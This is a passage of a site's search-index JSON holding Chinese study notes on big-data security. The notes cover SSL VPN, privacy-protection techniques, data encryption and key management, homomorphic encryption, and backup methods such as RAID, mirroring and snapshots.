\u8fde\u63a5\u662f\u4fdd\u5bc6\u7684\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u8fde\u63a5\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u91c7\u7528\u5bf9\u79f0\u5bc6\u7801\u4f53\u8d28\uff08\u5982\uff1aDES\u3001RC4\u7b49\uff09\u6765\u52a0\u5bc6\u6570\u636e\u3002 \u8fde\u63a5\u662f\u53ef\u9760\u7684\uff1a\u6d88\u606f\u7684\u4f20\u8f93\u91c7\u7528MAC\u7b97\u6cd5\uff08\u5982\uff1aMD5\u3001SHA\u7b49\uff09\u8fdb\u884c\u5b8c\u6574\u6027\u6821\u9a8c\u3002 \u5bf9\u7aef\u5b9e\u4f53\u7684\u9274\u522b\u91c7\u7528\u975e\u5bf9\u79f0\u79d8\u5bc6\u4f53\u5236\uff08\u5982\uff1aRSA\u3001DSS\u7b49\uff09\u8fdb\u884c\u8ba4\u8bc1\u3002 SSL VPN\u7cfb\u7edf\u7684\u7ec4\u6210\u6309\u529f\u80fd\u53ef\u5206\u4e3aSSL VPN\u670d\u52a1\u5668\u548cSSL VPN\u5ba2\u6237\u7aef\u3002SSL VPN\u670d\u52a1\u5668\u662f\u516c\u5171\u7f51\u7edc\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u7684\u6865\u6881\uff0c\u5b83\u4fdd\u62a4\u4e86\u5c40\u57df\u7f51\u5185\u7684\u62d3\u6251\u7ed3\u6784\u4fe1\u606f\u3002SSL VPN\u5ba2\u6237\u7aef\u662f\u8fd0\u884c\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684\u7a0b\u5e8f\uff0c\u5b83\u4e3a\u8fdc\u7a0b\u8ba1\u7b97\u673a\u901a\u8fc7\u516c\u5171\u7f51\u7edc\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u63d0\u4f9b\u4e00\u4e2a\u5b89\u5168\u901a\u9053\uff0c\u4f7f\u5f97\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53ef\u4ee5\u5b89\u5168\u5730\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u5185\u7684\u8d44\u6e90\u3002SSL VPN\u670d\u52a1\u5668\u7684\u4f5c\u7528\u76f8\u5f53\u4e8e\u4e00\u4e2a\u7f51\u5173\uff0c\u5b83\u62e5\u6709\u4e24\u79cdIP\u5730\u5740\uff1a\u4e00\u79cdIP\u5730\u5740\u7684\u7f51\u6bb5\u548c\u79c1\u6709\u5c40\u57df\u7f51\u5728\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u5e76\u4e14\u76f8\u5e94\u7684\u7f51\u5361\u76f4\u63a5\u8fde\u5728\u5c40\u57df\u7f51\u4e0a\uff1b\u53e6\u4e00\u79cdIP\u5730\u5740\u662f\u5408\u6cd5\u7533\u8bf7\u7684\u4e92\u8054\u7f51\u5730\u5740\uff0c\u5e76\u4e14\u76f8\u5e94\u7684\u7f51\u5361\u8fde\u63a5\u5230\u516c\u5171\u7f51\u7edc\u4e0a\u3002 \u5728SSL VPN\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u9488\u5bf9\u5176\u4ed6\u5e94\u7528\u5b9e\u73b0SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\uff0c\u8fd9\u79cd\u7a0b\u5e8f\u9700\u8981\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u5b89\u88c5\u548c\u914d\u7f6e\u3002SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\u7684\u89d2\u8272\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4ee3\u7406\u5ba2\u6237\u7aef\uff0c\u5f53\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8d44\u6e90\u65f6\uff0c\u5b83\u5c31\u5411SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\u53d1\u51fa\u8bf7\u6c42\uff0cSSL VPN\u5ba2\u6237\u7aef\u518d\u4e0eSSL VPN\u670d\u52a1\u5668\u5efa\u7acb\u5b89\u5168\u901a\u9053\uff0c\u7136\u540e\u8f6c\u53d1\u5e94\u7528\u7a0b\u5e8f\u5e76\u5728\u5c40\u57df\u7f51\u5185\u8fdb\u884c\u901a\u4fe1\u3002","title":"01.02 SSL VPN"},{"location":"data_security/big_data_security_copy/#02","text":"","title":"02 \u6570\u636e\u5b58\u50a8\u5b89\u5168\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0201","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u4ece\u9690\u79c1\u6240\u6709\u8005\u7684\u89d2\u5ea6\u800c\u8a00\uff0c\u9690\u79c1\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a \u4e2a\u4eba\u9690\u79c1\uff1a\u4efb\u4f55\u53ef\u4ee5\u786e\u8ba4\u7279\u5b9a\u4e2a\u4eba\u6216\u53ef\u786e\u8ba4\u7684\u4e2a\u4eba\u76f8\u5173\u3001\u4f46\u4e2a\u4eba\u4e0d\u613f\u88ab\u66b4\u9732\u7684\u4fe1\u606f\uff0c\u90fd\u53eb\u4e2a\u4eba\u9690\u79c1\uff0c\u5982\uff1a\u8eab\u4efd\u8bc1\u53f7\u3001\u5c31\u8bca\u8bb0\u5f55\u7b49\u3002 \u5171\u540c\u9690\u79c1\uff1a\u5171\u540c\u9690\u79c1\u4e0d\u4ec5\u5305\u542b\u4e2a\u4eba\u7684\u9690\u79c1\uff0c\u8fd8\u5305\u542b\u6240\u6709\u4e2a\u4eba\u5171\u540c\u8868\u73b0\u51fa\u4f46\u4e0d\u613f\u88ab\u66b4\u9732\u7684\u4fe1\u606f\uff0c\u5982\uff1a\u516c\u53f8\u5458\u5de5\u7684\u5e73\u5747\u85aa\u8d44\u3001\u85aa\u8d44\u5206\u5e03\u7b49\u4fe1\u606f\u3002 \u9690\u79c1\u4fdd\u62a4\u6280\u672f\u4e3b\u8981\u4fdd\u62a4\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\uff1a \u5982\u4f55\u4fdd\u8bc1\u6570\u636e\u5e94\u7528\u8fc7\u7a0b\u4e2d\u4e0d\u6cc4\u9732\u9690\u79c1\uff1b \u5982\u4f55\u66f4\u6709\u5229\u4e8e\u6570\u636e\u7684\u5e94\u7528\uff1b \u9690\u79c1\u4fdd\u62a4\u6280\u672f\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b3\u7c7b\uff1a","title":"02.01 \u9690\u79c1\u4fdd\u62a4"},{"location":"data_security/big_data_security_copy/#020101","text":"\u6240\u8c13\u6570\u636e\u53d8\u6362\uff0c\u7b80\u5355\u7684\u8bb2\u5c31\u662f\u5bf9\u654f\u611f\u5c5e\u6027\u8fdb\u884c\u8f6c\u6362\uff0c\u4f7f\u539f\u59cb\u6570\u636e\u90e8\u5206\u5931\u771f\uff0c\u4f46\u662f\u540c\u65f6\u4fdd\u6301\u67d0\u4e9b\u6570\u636e\u6216\u6570\u636e\u5c5e\u6027\u4e0d\u53d8\u7684\u4fdd\u62a4\u65b9\u6cd5\uff0c\u6570\u636e\u5931\u771f\u6280\u672f\u901a\u8fc7\u5e72\u6270\u539f\u59cb\u6570\u636e\u6765\u5b9e\u73b0\u9690\u79c1\u4fdd\u62a4\u3002","title":"02.01.01 \u57fa\u4e8e\u6570\u636e\u4ea4\u6362\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f"},{"location":"data_security/big_data_security_copy/#020102","text":"\u91c7\u7528\u5bf9\u79f0\u6216\u975e\u5bf9\u79f0\u52a0\u5bc6\u6280\u672f\u5728\u6570\u636e\u6316\u6398\u8fc7\u7a0b\u4e2d\u9690\u85cf\u654f\u611f\u6570\u636e\uff0c\u591a\u7528\u4e8e\u5206\u5e03\u5f0f\u5e94\u7528\u73af\u5883\u4e2d\uff0c\u5982\u5206\u5e03\u5f0f\u6570\u636e\u6316\u6398\u3001\u5206\u5e03\u5f0f\u5b89\u5168\u67e5\u8be2\u3001\u51e0\u4f55\u8ba1\u7b97\u3001\u79d1\u5b66\u8ba1\u7b97\u7b49\u3002\u5206\u5e03\u5f0f\u5e94\u7528\u4e00\u822c\u91c7\u7528\u4e24\u79cd\u6a21\u5f0f\u5b58\u50a8\u6570\u636e\uff1a\u5782\u76f4\u5212\u5206\u548c\u6c34\u5e73\u5212\u5206\u7684\u6570\u636e\u6a21\u5f0f\u3002\u5782\u76f4\u5212\u5206\u6570\u636e\u662f\u6307\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u6bcf\u4e2a\u7ad9\u70b9\u53ea\u5b58\u50a8\u90e8\u5206\u5c5e\u6027\u7684\u6570\u636e\uff0c\u6240\u6709\u7ad9\u70b9\u5b58\u50a8\u7684\u6570\u636e\u4e0d\u91cd\u590d\u3002\u6c34\u5e73\u5212\u5206\u6570\u636e\u662f\u5c06\u6570\u636e\u8bb0\u5f55\u5b58\u50a8\u5230\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u7684\u591a\u4e2a\u7ad9\u70b9\uff0c\u6240\u6709\u7ad9\u70b9\u5b58\u50a8\u7684\u6570\u636e\u4e0d\u91cd\u590d\u3002","title":"02.01.02 \u57fa\u4e8e\u6570\u636e\u52a0\u5bc6\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f"},{"location":"data_security/big_data_security_copy/#020103","text":"\u533f\u540d\u5316\u662f\u6307\u6839\u636e\u5177\u4f53\u60c5\u51b5\u6709\u6761\u4ef6\u5730\u53d1\u5e03\u6570\u636e\u3002\u5982\u4e0d\u53d1\u5e03\u6570\u636e\u7684\u67d0\u4e9b\u57df\u503c\u3001\u6570\u636e\u6cdb\u5316\u7b49\u3002\u9650\u5236\u53d1\u5e03\u5373\u6709\u9009\u62e9\u7684\u53d1\u5e03\u539f\u59cb\u6570\u636e\u3001\u4e0d\u53d1\u5e03\u6216\u8005\u53d1\u5e03\u7cbe\u5ea6\u8f83\u4f4e\u7684\u654f\u611f\u6570\u636e\uff0c\u4ee5\u5b9e\u73b0\u9690\u79c1\u4fdd\u62a4\u3002\u6570\u636e\u533f\u540d\u5316\u4e00\u822c\u91c7\u7528\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c\uff1a \u6291\u5236\uff1a\u6291\u5236\u67d0\u6570\u636e\u9879\uff0c\u5373\u4e0d\u53d1\u5e03\u8be5\u6570\u636e\u9879\u3002 \u6cdb\u5316\uff1a\u6cdb\u5316\u662f\u5bf9\u6570\u636e\u8fdb\u884c\u6982\u51b5\u3001\u62bd\u8c61\u7684\u63cf\u8ff0\u3002\u8b6c\u5982\uff0c\u5bf9\u6574\u65705\u7684\u4e00\u79cd\u6cdb\u5316\u5f62\u5f0f\u662f[3,6]\uff0cW\u4e3a5\u5728\u533a\u95f4[3,6]\u5185\u3002","title":"02.01.03 \u57fa\u4e8e\u533f\u540d\u5316\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f"},{"location":"data_security/big_data_security_copy/#0202","text":"\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a\u9759\u6001\u6570\u636e\u548c\u52a8\u6001\u6570\u636e\u3002 \u9759\u6001\u6570\u636e\u662f\u6307\uff1a\u6587\u6863\u3001\u62a5\u8868\u3001\u8d44\u6599\u7b49\u4e0d\u53c2\u4e0e\u8ba1\u7b97\u7684\u6570\u636e\uff1b \u52a8\u6001\u6570\u636e\u662f\u6307\u9700\u8981\u68c0\u7d22\u6216\u53c2\u4e0e\u8ba1\u7b97\u7684\u6570\u636e\u3002 \u4f7f\u7528SSL VPN\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\uff0c\u4f46\u5b58\u50a8\u7cfb\u7edf\u8981\u5148\u89e3\u5bc6\u6570\u636e\uff0c\u7136\u540e\u8fdb\u884c\u5b58\u50a8\uff0c\u5f53\u6570\u636e\u4ee5\u660e\u6587\u7684\u65b9\u5f0f\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\u65f6\uff0c\u9762\u5bf9\u672a\u88ab\u6388\u6743\u5165\u4fb5\u8005\u7684\u7834\u574f\u3001\u4fee\u6539\u548c\u91cd\u653e\u653b\u51fb\u663e\u5f97\u5f88\u8106\u5f31\uff0c\u5bf9\u91cd\u8981\u6570\u636e\u7684\u5b58\u50a8\u52a0\u5bc6\u662f\u5fc5\u987b\u91c7\u53d6\u7684\u6280\u672f\u624b\u6bb5\u3002","title":"02.02 \u6570\u636e\u52a0\u5bc6"},{"location":"data_security/big_data_security_copy/#020201","text":"","title":"02.02.01 \u9759\u6001\u6570\u636e\u52a0\u5bc6\u673a\u5236"},{"location":"data_security/big_data_security_copy/#02020101","text":"\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5\u5206\u4e3a\u4e24\u7c7b\uff0c\u5bf9\u79f0\u52a0\u5bc6\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5b9e\u9645\u5de5\u7a0b\u4e2d\u5e38\u7528\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u5bf9\u79f0\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u7ed3\u5408\u8d77\u6765\uff0c\u5229\u7528\u975e\u5bf9\u79f0\u5bc6\u94a5\u4f53\u7cfb\u8fdb\u884c\u5bc6\u94a5\u5206\u914d\uff0c\u5229\u7528\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u7b97\u6cd5\u8fdb\u884c\u6570\u636e\u7684\u52a0\u5bc6\uff0c\u5c24\u5176\u662f\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u52a0\u5bc6\u5927\u91cf\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u79cd\u7ed3\u5408\u5c24\u5176\u91cd\u8981\u3002","title":"02.02.01.01 \u6570\u636e\u52a0\u5bc6\u7b97\u6cd5"},{"location":"data_security/big_data_security_copy/#02020102","text":"\u6839\u636e\u6570\u636e\u654f\u611f\u6027\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u6709\u9009\u62e9\u7684\u52a0\u5bc6\uff0c\u4ec5\u5bf9\u654f\u611f\u6570\u636e\u8fdb\u884c\u6309\u9700\u52a0\u5bc6\u5b58\u50a8\uff0c\u800c\u514d\u9664\u5bf9\u4e0d\u654f\u611f\u6570\u636e\u7684\u52a0\u5bc6\uff0c\u53ef\u4ee5\u51cf\u5c0f\u52a0\u5bc6\u5b58\u50a8\u5bf9\u7cfb\u7edf\u6027\u80fd\u9020\u6210\u7684\u635f\u5931\uff0c\u5bf9\u7ef4\u6301\u7cfb\u7edf\u7684\u9ad8\u6027\u80fd\u6709\u7740\u79ef\u6781\u7684\u610f\u4e49\u3002","title":"02.02.01.02 \u52a0\u5bc6\u8303\u56f4"},{"location":"data_security/big_data_security_copy/#02020103","text":"\u5bc6\u94a5\u7ba1\u7406\u65b9\u6848\u4e3b\u8981\u5305\u62ec\uff1a\u5bc6\u94a5\u7c92\u5ea6\u7684\u9009\u62e9\u3001\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u4ee5\u53ca\u5bc6\u94a5\u5206\u53d1\u673a\u5236\u3002\u5bc6\u94a5\u662f\u6570\u636e\u52a0\u5bc6\u4e0d\u53ef\u6216\u7f3a\u7684\u90e8\u5206\uff0c\u5bc6\u94a5\u6570\u636e\u7684\u591a\u5c11\u4e0e\u5bc6\u94a5\u7684\u7c92\u5ea6\u76f4\u63a5\u76f8\u5173\u3002\u5bc6\u94a5\u7c92\u5ea6\u8f83\u5927\u65f6\uff0c\u65b9\u4fbf\u7528\u6237\u7ba1\u7406\uff0c\u4f46\u4e0d\u9002\u5408\u4e8e\u7ec6\u7c92\u5ea6\u7684\u8bbf\u95ee\u63a7\u5236\u3002\u5bc6\u94a5\u7c92\u5ea6\u5c0f\u65f6\uff0c\u53ef\u5b9e\u73b0\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\uff0c\u5b89\u5168\u6027\u66f4\u9ad8\uff0c\u4f46\u4ea7\u751f\u7684\u5bc6\u94a5\u6570\u91cf\u5927\u96be\u4e8e\u7ba1\u7406\u3002 \u9002\u5408\u5927\u6570\u636e\u5b58\u50a8\u7684\u5bc6\u94a5\u7ba1\u7406\u529e\u6cd5\u4e3b\u8981\u662f\u5206\u5c42\u5bc6\u94a5\u7ba1\u7406\uff0c\u5373\"\u91d1\u5b57\u5854\"\u5f0f\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u3002\u8fd9\u79cd\u5bc6\u94a5\u7ba1\u7406\u4f53\u7cfb\u5c31\u662f\u5c06\u5bc6\u94a5\u4ee5\u91d1\u5b57\u5854\u7684\u65b9\u5f0f\u5b58\u653e\uff0c\u4e0a\u5c42\u5bc6\u94a5\u7528\u6765\u52a0/\u89e3\u5bc6\u4e0b\u5c42\u5bc6\u94a5\uff0c\u53ea\u9700\u5c06\u9876\u5c42\u5bc6\u94a5\u5206\u53d1\u7ed9\u6570\u636e\u8282\u70b9\uff0c\u5176\u4ed6\u5c42\u5bc6\u94a5\u5747\u53ef\u76f4\u63a5\u5b58\u653e\u4e8e\u7cfb\u7edf\u4e2d\u3002\u8003\u8651\u5230\u5b89\u5168\u6027\uff0c\u5927\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u9700\u8981\u91c7\u7528\u4e2d\u7b49\u6216\u7ec6\u7c92\u5ea6\u7684\u5bc6\u94a5\uff0c\u56e0\u6b64\u5bc6\u94a5\u6570\u91cf\u591a\uff0c\u800c\u91c7\u7528\u5206\u5c42\u5bc6\u94a5\u7ba1\u7406\u65f6\uff0c\u6570\u636e\u8282\u70b9\u53ea\u9700\u4fdd\u7ba1\u5c11\u6570\u5bc6\u94a5\u5c31\u53ef\u5bf9\u5927\u91cf\u5bc6\u94a5\u52a0\u4ee5\u7ba1\u7406\uff0c\u6548\u7387\u66f4\u9ad8\u3002 \u53ef\u4ee5\u4f7f\u7528\u57fa\u4e8ePKI\u4f53\u7cfb\u7684\u5bc6\u94a5\u5206\u53d1\u65b9\u5f0f\u5bf9\u9876\u5c42\u5bc6\u94a5\u8fdb\u884c\u5206\u53d1\uff0c\u7528\u6bcf\u4e2a\u6570\u636e\u8282\u70b9\u7684\u516c\u94a5\u52a0\u5bc6\u5bf9\u79f0\u5bc6\u94a5\uff0c\u53d1\u9001\u7ed9\u76f8\u5e94\u7684\u6570\u636e\u8282\u70b9\uff0c\u6570\u636e\u8282\u70b9\u63a5\u6536\u5230\u5bc6\u6587\u7684\u5bc6\u94a5\u540e\uff0c\u4f7f\u7528\u79c1\u94a5\u89e3\u5bc6\u83b7\u5f97\u5bc6\u94a5\u660e\u6587\u3002","title":"02.02.01.03 \u5bc6\u94a5\u7ba1\u7406\u65b9\u6848"},{"location":"data_security/big_data_security_copy/#020202","text":"\u540c\u6001\u52a0\u5bc6\u662f\u57fa\u4e8e\u6570\u5b66\u96be\u9898\u7684\u8ba1\u7b97\u590d\u6742\u6027\u7406\u8bba\u7684\u5bc6\u7801\u5b66\u6280\u672f\u3002\u5bf9\u7ecf\u8fc7\u540c\u6001\u52a0\u5bc6\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\u5f97\u5230\u4e00\u4e2a\u8f93\u51fa\uff0c\u5c06\u8fd9\u4e00\u8f93\u51fa\u8fdb\u884c\u89e3\u5bc6\uff0c\u5176\u7ed3\u679c\u4e0e\u7528\u7edf\u4e00\u65b9\u6cd5\u5904\u7406\u672a\u52a0\u5bc6\u7684\u539f\u59cb\u6570\u636e\u5f97\u5230\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002\u8bb0\u5f55\u52a0\u5bc6\u64cd\u4f5c\u4e3aE\uff0c\u660e\u6587\u4e3am\uff0c\u52a0\u5bc6\u5f97e\uff0c\u5373e=E(m)\uff0cm=E'(e)\u3002\u5df2\u77e5\u9488\u5bf9\u660e\u6587\u6709\u64cd\u4f5cf\uff0c\u9488\u5bf9E\u53ef\u4ee5\u6784\u9020F\uff0c\u4f7f\u5f97F(e)=E(f(m))\uff0c\u8fd9\u6837E\u5c31\u662f\u4e00\u4e2a\u9488\u5bf9f\u7684\u540c\u6001\u52a0\u5bc6\u7b97\u6cd5\u3002 \u540c\u6001\u52a0\u5bc6\u6280\u672f\u662f\u5bc6\u7801\u5b66\u9886\u57df\u7684\u4e00\u4e2a\u91cd\u8981\u8bfe\u9898\uff0c\u76ee\u524d\u5c1a\u6ca1\u6709\u771f\u6b63\u53ef\u7528\u4e8e\u5b9e\u9645\u7684\u5168\u540c\u6001\u52a0\u5bc6\u7b97\u6cd5\uff0c\u540c\u6001\u6280\u672f\u4f7f\u5f97\u5728\u52a0\u5bc6\u7684\u6570\u636e\u4e2d\u8fdb\u884c\u8bf8\u5982\u68c0\u7d22\u3001\u6bd4\u8f83\u7b49\u64cd\u4f5c\uff0c\u5f97\u51fa\u6b63\u786e\u7684\u7ed3\u679c\uff0c\u800c\u5728\u6574\u4e2a\u5904\u7406\u8fc7\u7a0b\u4e2d\u65e0\u9700\u5bf9\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\u3002\u5176\u610f\u4e49\u5728\u4e8e\uff0c\u771f\u6b63\u4ece\u6839\u672c\u4e0a\u89e3\u51b3\u5c06\u5927\u6570\u636e\u673a\u5668\u64cd\u4f5c\u7684\u4fdd\u5bc6\u95ee\u9898\u3002","title":"02.02.02 \u52a8\u6001\u6570\u636e\u52a0\u5bc6\u673a\u5236"},{"location":"data_security/big_data_security_copy/#0203","text":"\u6570\u636e\u5b58\u50a8\u7cfb\u7edf\u5e94\u63d0\u4f9b\u5b8c\u5907\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u673a\u5236\u6765\u4fdd\u969c\u6570\u636e\u7684\u53ef\u7528\u6027\u548c\u5b8c\u6574\u6027\uff0c\u4e00\u65e6\u53d1\u751f\u6570\u636e\u4e22\u5931\u6216\u7834\u574f\uff0c\u53ef\u4ee5\u5229\u7528\u5907\u4efd\u6765\u6062\u590d\u6570\u636e\uff0c\u4ece\u800c\u4fdd\u8bc1\u5728\u6545\u969c\u53d1\u751f\u540e\u6570\u636e\u4e0d\u4e22\u5931\u3002 \u4e0b\u9762\u662f\u51e0\u79cd\u5e38\u89c1\u7684\u5907\u4efd\u4e0e\u6062\u590d\u673a\u5236\uff1a","title":"02.03 \u5907\u4efd\u4e0e\u6062\u590d"},{"location":"data_security/big_data_security_copy/#020301","text":"\u5f02\u5730\u5907\u4efd\u662f\u4fdd\u62a4\u6570\u636e\u6700\u5b89\u5168\u7684\u65b9\u5f0f\u3002\u5728\u53d1\u751f\u706b\u707e\u3001\u5730\u9707\u7b49\u91cd\u5927\u707e\u96be\u7684\u60c5\u51b5\uff0c\u5728\u5176\u4ed6\u4fdd\u62a4\u6570\u636e\u7684\u624b\u6bb5\u90fd\u4e0d\u8d77\u4f5c\u7528\u65f6\uff0c\u5f02\u5730\u5bb9\u707e\u7684\u4f18\u52bf\u5c31\u4f53\u73b0\u51fa\u6765\u4e86\u3002\u56f0\u6270\u5f02\u5730\u5bb9\u707e\u7684\u95ee\u9898\u5728\u4e8e\u901f\u5ea6\u548c\u6210\u672c\uff0c\u8fd9\u8981\u6c42\u62e5\u6709\u8db3\u591f\u5e26\u5bbd\u7684\u7f51\u7edc\u8fde\u63a5\u548c\u4f18\u79c0\u7684\u6570\u636e\u590d\u5236\u7ba1\u7406\u8f6f\u4ef6\u3002","title":"02.03.01 \u5f02\u5730\u5907\u4efd"},{"location":"data_security/big_data_security_copy/#020302-raid","text":"RAID\uff08\u72ec\u7acb\u78c1\u76d8\u5197\u4f59\u9635\u5217\uff09\u53ef\u4ee5\u51cf\u5c11\u78c1\u76d8\u90e8\u4ef6\u7684\u635f\u574f\uff1bRAID\u7cfb\u7edf\u4f7f\u7528\u8bb8\u591a\u5c0f\u5bb9\u91cf\u78c1\u76d8\u9a71\u52a8\u5668\u6765\u5b58\u50a8\u5927\u91cf\u6570\u636e\uff0c\u5e76\u4e14\u4f7f\u53ef\u9760\u6027\u548c\u5197\u4f59\u6027\u5f97\u5230\u589e\u5f3a\uff1b\u6240\u6709\u7684RAID\u7cfb\u7edf\u5171\u540c\u7684\u7279\u70b9\u662f\"\u70ed\u4ea4\u6362\"\u80fd\u529b\uff0c\u5373\u7528\u6237\u53ef\u4ee5\u53d6\u51fa\u4e00\u4e2a\u5b58\u5728\u7f3a\u9677\u7684\u9a71\u52a8\u5668\uff0c\u5e76\u63d2\u5165\u4e00\u4e2a\u65b0\u7684\u4e88\u4ee5\u66f4\u6362\u3002\u5bf9\u5927\u591a\u6570\u7c7b\u578b\u7684RAID\u6765\u8bf4\uff0c\u4e0d\u5fc5\u4e2d\u65ad\u670d\u52a1\u5668\u6216\u7cfb\u7edf\uff0c\u5c31\u53ef\u4ee5\u81ea\u52a8\u91cd\u5efa\u67d0\u4e2a\u51fa\u73b0\u6545\u969c\u78c1\u76d8\u4e0a\u7684\u6570\u636e\u3002","title":"02.03.02 RAID"},{"location":"data_security/big_data_security_copy/#020303","text":"\u6570\u636e\u955c\u50cf\u5c31\u662f\u4fdd\u7559\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u5728\u7ebf\u6570\u636e\u7684\u62f7\u8d1d\u3002\u4ee5\u4e24\u4e2a\u955c\u50cf\u78c1\u76d8\u4e3a\u4f8b\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5728\u4e24\u4e2a\u72ec\u7acb\u7684\u78c1\u76d8\u4e0a\u540c\u65f6\u8fdb\u884c\uff1b\u5f53\u4e24\u4e2a\u78c1\u76d8\u90fd\u6b63\u5e38\u5de5\u4f5c\u65f6\uff0c\u6570\u636e\u53ef\u4ee5\u4ece\u4efb\u4e00\u78c1\u76d8\u8bfb\u53d6\uff1b\u5982\u679c\u4e00\u4e2a\u78c1\u76d8\u5931\u6548\uff0c\u5219\u6570\u636e\u8fd8\u53ef\u4ee5\u4ece\u53e6\u5916\u4e00\u4e2a\u6b63\u5e38\u5de5\u4f5c\u7684\u78c1\u76d8\u8bfb\u51fa\u3002\u8fdc\u7a0b\u955c\u50cf\u6839\u636e\u91c7\u7528\u7684\u5199\u534f\u8bae\u4e0d\u540c\u53ef\u5212\u5206\u4e3a\u4e24\u79cd\u65b9\u5f0f\uff0c\u5373\u540c\u6b65\u955c\u50cf\u548c\u5f02\u6b65\u955c\u50cf\u3002\u672c\u5730\u793e\u4fdd\u9047\u5230\u4e0d\u53ef\u6062\u590d\u7684\u786c\u4ef6\u635f\u574f\u65f6\uff0c\u4ecd\u53ef\u4ee5\u542f\u52a8\u5f02\u5730\u4e0e\u6b64\u76f8\u540c\u73af\u5883\u548c\u5185\u5bb9\u7684\u955c\u50cf\u8bbe\u5907\uff0c\u4ee5\u4fdd\u969c\u670d\u52a1\u4e0d\u95f4\u65ad\u3002","title":"02.03.03 \u6570\u636e\u955c\u50cf"},{"location":"data_security/big_data_security_copy/#020304","text":"\u5feb\u7167\u53ef\u4ee5\u662f\u5176\u6240\u8868\u793a\u6570\u636e\u7684\u4e00\u4e2a\u526f\u672c\uff0c\u4e5f\u53ef\u4ee5\u662f\u6570\u636e\u7684\u4e00\u4e2a\u590d\u5236\u54c1\u3002\u5feb\u7167\u53ef\u4ee5\u8fc5\u901f\u6062\u590d\u906d\u7834\u574f\u7684\u6570\u636e\u3002\u5feb\u7167\u7684\u4f5c\u7528\u4e3b\u8981\u662f\u80fd\u591f\u8fdb\u884c\u5728\u7ebf\u6570\u636e\u5907\u4efd\u4e0e\u6062\u590d\u3002\u5f53\u5b58\u50a8\u8bbe\u5907\u53d1\u751f\u5e94\u7528\u6545\u969c\u6216\u8005\u6587\u4ef6\u635f\u574f\u65f6\u53ef\u4ee5\u8fdb\u884c\u5feb\u901f\u7684\u6570\u636e\u6062\u590d\uff0c\u5c06\u6570\u636e\u6062\u590d\u67d0\u4e2a\u53ef\u7528\u65f6\u95f4\u70b9\u7684\u72b6\u6001\u3002 \u6570\u636e\u91cf\u6bd4\u8f83\u5c0f\u7684\u65f6\u5019\uff0c\u5907\u4efd\u548c\u6062\u590d\u6570\u636e\u6bd4\u8f83\u7b80\u5355\uff0c\u968f\u7740\u6570\u636e\u91cf\u8fbe\u5230PB\u7ea7\u522b\uff0c\u5907\u4efd\u548c\u6062\u590d\u5982\u6b64\u5e9e\u5927\u7684\u6570\u636e\u6210\u4e3a\u68d8\u624b\u7684\u95ee\u9898\u3002\u76ee\u524dHadoop\u662f\u5e94\u7528\u6700\u5e7f\u6cdb\u7684\u5927\u6570\u636e\u8f6f\u4ef6\u67b6\u6784\uff0cHadoop\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edfHDFS\u53ef\u4ee5\u5229\u7528\u5176\u81ea\u8eab\u7684\u6570\u636e\u5907\u4efd\u548c\u6062\u590d\u673a\u5236\u6765\u5b9e\u73b0\u6570\u636e\u53ef\u9760\u4fdd\u62a4\u3002 